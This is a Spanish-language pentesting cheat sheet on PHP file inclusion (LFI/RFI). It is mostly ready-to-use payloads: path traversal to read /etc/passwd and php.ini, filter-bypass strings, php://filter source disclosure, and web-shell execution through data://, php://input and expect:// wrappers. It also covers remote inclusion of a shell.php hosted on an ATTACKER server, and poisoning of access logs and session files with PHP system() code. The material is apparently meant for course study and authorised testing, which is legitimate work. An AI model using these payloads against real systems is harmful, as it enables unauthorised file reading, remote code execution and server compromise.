---
title: File Inclusion (LFI/RFI, PHP wrappers, log/session poisoning)
slug: file-inclusion
category: techniques
updated: 2026-08-20
summary: "LFI: traversal + bypass (....//, %2e%2e%2f, %00, path-trunc), leer source (php://filter base64), RCE (data://, php://input, expect://, RFI http/ftp/smb, log/session poisoning)"
tags: [web, lfi, rfi, php-wrappers, log-poisoning, rce, path-traversal]
sensitive: false
---

# File Inclusion (LFI / RFI)

## When to use
Parámetro que la app usa para incluir un archivo (`?language=es.php`, `?page=`).
Vulnerable → leer archivos locales (LFI) y a menudo RCE. Hub: [[web-app-attacks]].
Funciones peligrosas PHP: `include()/require()` (ejecutan + URL remota), `file_get_contents()` (solo lee).

## LFI básico + traversal
```
?language=/etc/passwd                 # ruta absoluta (si include($_GET['x']) directo)
?language=../../../../etc/passwd       # traversal relativo (funciona con prefijo de dir)
?language=/../../../etc/passwd         # si hay prefijo (include("lang_".$x)) → / lo trata como dir
```
Windows: `C:\Windows\boot.ini`. Usar muchos `../` no rompe (raíz absorbe). **Second-order**: envenenar un valor (ej. username `../../../etc/passwd`) que otra función incluye luego.

## Bypass de filtros
```
....//....//....//etc/passwd           # traversal no-recursivo (str_replace '../' una vez)
%2e%2e%2f%2e%2e%2f...%2f%65%74%63%2f%70%61%73%73%77%64   # URL-encode (incl. puntos); doble-encode si hace falta
./languages/../../../../etc/passwd     # bypass "approved path" regex ^./languages/
```
Extensión añadida (`.$x.".php"`) → leer source con php://filter (abajo). Legacy (PHP <5.3.4/<5.5):
```
/etc/passwd%00                         # null byte (PHP <5.5)
non_existing/../../../etc/passwd/./././[×2048]   # path truncation (4096 chars → trunca .php)
```

## Leer código fuente (php://filter)
```
?language=php://filter/read=convert.base64-encode/resource=config
# → base64 del source (no se ejecuta). Decodificar: echo '...' | base64 -d
# Fuzz archivos PHP primero: ffuf -w dirlist.txt -u http://T/FUZZ.php  (incluir 301/302/403)
```

## RCE — PHP wrappers (requieren allow_url_include=On, verificar leyendo php.ini)
```
# data:// — web shell base64 inline
echo '<?php system($_GET["cmd"]); ?>' | base64   # PD9waHAg...
?language=data://text/plain;base64,PD9waHAg...&cmd=id
# php://input — shell en el body POST
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://T/index.php?language=php://input&cmd=id"
# expect:// — ejecuta directo (extensión expect, verificar con grep expect en php.ini)
?language=expect://id
```
Verificar config: `...php://filter/.../resource=../../../../etc/php/7.4/apache2/php.ini` → `base64 -d | grep allow_url_include`.

## RCE — RFI (Remote File Inclusion)
Requiere que la función permita URL remota (`allow_url_include=On` en PHP; SMB en Windows no lo requiere).
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server 80        # o pyftpdlib (ftp://) o impacket-smbserver (\\IP\share)
?language=http://ATTACKER:80/shell.php&cmd=id
?language=ftp://user:pass@ATTACKER/shell.php&cmd=id
?language=\\ATTACKER\share\shell.php&cmd=whoami     # SMB (Windows, sin allow_url_include; mejor misma red)
```
Probar primero `http://127.0.0.1:80/index.php` (confirma RFI sin salir por firewall). No incluir la propia página (loop → DoS).

## RCE — Log / Session poisoning (cuando no hay wrappers/RFI)
```
# PHP session: cookie PHPSESSID=abc → /var/lib/php/sessions/sess_abc (Win: C:\Windows\Temp\)
# 1. envenenar un valor controlado:  ?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
# 2. incluir el archivo de sesión + &cmd=id
?language=/var/lib/php/sessions/sess_abc&cmd=id
# Apache/Nginx access.log: envenenar User-Agent (Nginx legible por www-data; Apache suele root/adm)
echo -n 'User-Agent: <?php system($_GET["cmd"]); ?>' > Poison
curl -s "http://T/index.php" -H @Poison
?language=/var/log/apache2/access.log&cmd=id      # Win: C:\xampp\apache\logs\
```
Otros logs: `/proc/self/environ`, `/proc/self/fd/N`, `/var/log/{sshd.log,mail,vsftpd.log}` (login/mail con username = PHP). Wordlist rutas: SecLists `Fuzzing/LFI`.

## Gotchas
- Logs enormes → incluirlos puede colgar el server; en prod, cuidado (roza DoS, prohibido).
- Session file se sobreescribe tras cada include → re-envenenar, o escribir web shell permanente / reverse shell.
- Prefijo del server (`lang_`) rompe wrappers/RFI → probar traversal simple primero.

## References
- Relacionado: [[web-app-attacks]], [[command-injection]], [[server-side-attacks]], [[reverse-shells]], [[file-upload-attacks]]
- Curso CWES Bug Bounty → 03-WEB → "File Inclusion" (HTB Academy). Notion.
